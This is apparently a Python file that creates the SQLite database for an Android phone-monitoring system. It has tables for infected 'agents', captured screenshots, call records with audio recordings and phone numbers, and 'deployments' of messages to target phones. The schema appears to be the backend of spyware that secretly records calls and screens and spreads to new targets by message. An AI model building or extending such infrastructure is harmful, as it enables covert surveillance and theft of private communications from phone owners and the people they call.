import sqlite3
import os
from datetime import datetime

class DatabaseManager:
    def __init__(self, db_path='mp_agent.db'):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize the database with all required tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Agents table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT UNIQUE NOT NULL,
                phone_model TEXT,
                android_version TEXT,
                ip_address TEXT,
                status TEXT DEFAULT 'active',
                first_seen DATETIME,
                last_seen DATETIME,
                screenshot_count INTEGER DEFAULT 0,
                call_records INTEGER DEFAULT 0,
                last_screenshot DATETIME
            )
        ''')
        
        # Screenshots table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                screenshot_data BLOB,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        # Call records table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS call_records (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                call_type TEXT,
                phone_number TEXT,
                duration INTEGER,
                audio_data BLOB,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        # Deployments table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS deployments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_phone TEXT,
                source_phone TEXT,
                message_sent TEXT,
                status TEXT,
                timestamp DATETIME
            )
        ''')
        
        # System logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS system_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                level TEXT,
                message TEXT,
                timestamp DATETIME
            )
        ''')
        
        conn.commit()
        conn.close()
        print("✅ Database initialized successfully")
    
    def log_event(self, level, message):
        """Log system events"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
            (level, message, datetime.now())
        )
        conn.commit()
        conn.close()

# Initialize database
db = DatabaseManager()